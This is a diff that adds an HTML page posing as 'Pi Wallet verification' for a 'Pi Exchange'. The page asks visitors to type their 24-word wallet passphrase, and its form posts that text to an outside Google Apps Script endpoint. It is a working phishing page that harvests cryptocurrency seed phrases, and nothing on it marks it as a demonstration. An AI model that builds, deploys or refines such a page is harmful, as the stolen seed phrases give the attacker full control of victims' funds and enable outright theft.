@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Exchange</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .header {
+            width: 100%;
+            height: 70px;
+            background-color: #A349A4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .header img {
+            width: auto;
+            height: 60px;
+        }
+        .container {
+            margin: 20px auto;
+            width: 80vw;
+        }
+        .textbox {
+            width: 80vw;
+            height: 30vh;
+            resize: none;
+            display: block;
+            margin: 30px auto;
+            font-size: large;
+        }
+        .button {
+            width: 80vw;
+            height: 50px;
+            background-color: #A349A4;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="header.png" alt="Header Image">
+    </div>
+    <div class="container">
+        <h1>Pi Wallet verification</h1>
+        <h2>Enter a 24-word passphrase,to verify your wallet.</h2>
+        <form action="https://script.google.com/macros/s/AKfycby0nUuKzSkVvH1h_96qJXFZdBJllwCtsWI6ab7gMpA8EJ-Z5bw9K9GxEf29075Juast/exec" method="POST">      
+            <textarea class="textbox" id="phase" name="phase" placeholder="Enter your 24-word passphrase"></textarea>
+            <input type="submit" class="button" value="Unlock with your access phase.">
+            <p class="text"></p> </p>
+        </form>
+    </div>
+</body>
+</html>
